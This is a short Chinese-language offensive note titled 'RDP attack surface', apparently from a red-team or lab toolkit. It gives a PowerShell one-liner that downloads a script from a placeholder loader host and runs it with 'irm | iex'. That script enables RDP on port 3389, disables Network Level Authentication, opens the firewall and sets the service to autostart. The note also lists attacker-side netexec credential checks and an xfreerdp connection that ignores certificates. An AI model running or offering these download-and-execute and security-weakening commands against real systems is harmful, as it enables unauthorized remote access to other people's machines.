# RDP 攻击面

`rdp_enable.ps1`：开 3389 + 关闭 NLA + 放行防火墙 + TermService 自启。

```powershell
irm http://LOADER_IP:8090/rdp/rdp_enable.ps1 | iex
irm http://LOADER_IP:8090/rdp/rdp_enable.ps1 | iex -Revert
```

攻击侧：
```bash
nxc rdp <IP> -u user -p pass
xfreerdp /v:<IP> /u:<user> /p:<pass> /cert:ignore /dynamic-resolution
```
